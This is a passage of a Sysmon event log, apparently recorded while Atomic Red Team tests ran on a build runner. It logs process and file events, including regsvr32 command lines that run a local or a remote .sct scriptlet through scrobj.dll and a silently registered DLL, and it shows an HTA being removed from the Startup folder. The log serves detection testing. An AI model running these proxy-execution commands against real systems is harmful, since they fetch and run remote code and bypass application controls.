OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\syswow64\regsvr32.exe  /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=097108607177A9282D10CD4808221B171B729AFBADB1EBA3C99139348AC8295F
ParentProcessGuid: {f995aebf-6417-6942-c706-000000000e00}
ParentProcessId: 8336
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll )
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:39.682
ProcessGuid: {f995aebf-6417-6942-c706-000000000e00}
ProcessId: 8336
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c IF ""%%PROCESSOR_ARCHITECTURE%%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll )
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:39.249
ProcessGuid: {f995aebf-6417-6942-c406-000000000e00}
ProcessId: 6288
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-6417-6942-c206-000000000e00}
ParentProcessId: 6232
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:39.226
ProcessGuid: {f995aebf-6417-6942-c206-000000000e00}
ProcessId: 6232
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:38.840
ProcessGuid: {f995aebf-6416-6942-bf06-000000000e00}
ProcessId: 4272
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-6416-6942-bd06-000000000e00}
ParentProcessId: 5204
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:38.818
ProcessGuid: {f995aebf-6416-6942-bd06-000000000e00}
ProcessId: 5204
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct"" scrobj.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:38.638
ProcessGuid: {f995aebf-6416-6942-bc06-000000000e00}
ProcessId: 6860
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:35.991
ProcessGuid: {f995aebf-6413-6942-b906-000000000e00}
ProcessId: 852
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:35 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:35.705
ProcessGuid: {f995aebf-6413-6942-b706-000000000e00}
ProcessId: 4536
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dirpxk2l.fhv.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:35 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:35.683
ProcessGuid: {f995aebf-6413-6942-b706-000000000e00}
ProcessId: 4536
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dirpxk2l.fhv.ps1
CreationUtcTime: 2025-12-17 08:04:35.683
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:35.599
ProcessGuid: {f995aebf-6413-6942-b706-000000000e00}
ProcessId: 4536
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:35 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:35.310
ProcessGuid: {f995aebf-6413-6942-b506-000000000e00}
ProcessId: 2764
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vpuwpl1f.3c0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:35 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:35.290
ProcessGuid: {f995aebf-6413-6942-b506-000000000e00}
ProcessId: 2764
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vpuwpl1f.3c0.ps1
CreationUtcTime: 2025-12-17 08:04:35.288
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:35.207
ProcessGuid: {f995aebf-6413-6942-b506-000000000e00}
ProcessId: 2764
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:34 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:34.919
ProcessGuid: {f995aebf-6412-6942-b306-000000000e00}
ProcessId: 2532
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_oacsvibi.j4c.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:34.899
ProcessGuid: {f995aebf-6412-6942-b306-000000000e00}
ProcessId: 2532
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_oacsvibi.j4c.ps1
CreationUtcTime: 2025-12-17 08:04:34.899
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:34.815
ProcessGuid: {f995aebf-6412-6942-b306-000000000e00}
ProcessId: 2532
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:34 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:34.518
ProcessGuid: {f995aebf-6412-6942-b106-000000000e00}
ProcessId: 7876
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rci4atlk.1ju.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:34.494
ProcessGuid: {f995aebf-6412-6942-b106-000000000e00}
ProcessId: 7876
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rci4atlk.1ju.ps1
CreationUtcTime: 2025-12-17 08:04:34.494
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:34.404
ProcessGuid: {f995aebf-6412-6942-b106-000000000e00}
ProcessId: 7876
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:34 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:34.117
ProcessGuid: {f995aebf-6412-6942-af06-000000000e00}
ProcessId: 9104
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xybe1iik.k2i.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:34.097
ProcessGuid: {f995aebf-6412-6942-af06-000000000e00}
ProcessId: 9104
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xybe1iik.k2i.ps1
CreationUtcTime: 2025-12-17 08:04:34.097
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:34.013
ProcessGuid: {f995aebf-6412-6942-af06-000000000e00}
ProcessId: 9104
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:33 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:33.723
ProcessGuid: {f995aebf-6411-6942-ad06-000000000e00}
ProcessId: 9256
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_szt0uhbs.da4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:33.703
ProcessGuid: {f995aebf-6411-6942-ad06-000000000e00}
ProcessId: 9256
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_szt0uhbs.da4.ps1
CreationUtcTime: 2025-12-17 08:04:33.703
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:33.612
ProcessGuid: {f995aebf-6411-6942-ad06-000000000e00}
ProcessId: 9256
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:33 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:33.223
ProcessGuid: {f995aebf-6411-6942-ab06-000000000e00}
ProcessId: 7264
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lapwjhtd.yiu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:33.201
ProcessGuid: {f995aebf-6411-6942-ab06-000000000e00}
ProcessId: 7264
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lapwjhtd.yiu.ps1
CreationUtcTime: 2025-12-17 08:04:33.201
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:33.115
ProcessGuid: {f995aebf-6411-6942-ab06-000000000e00}
ProcessId: 7264
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {remove-item \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\"""" -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:32.900
ProcessGuid: {f995aebf-6410-6942-a906-000000000e00}
ProcessId: 5548
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
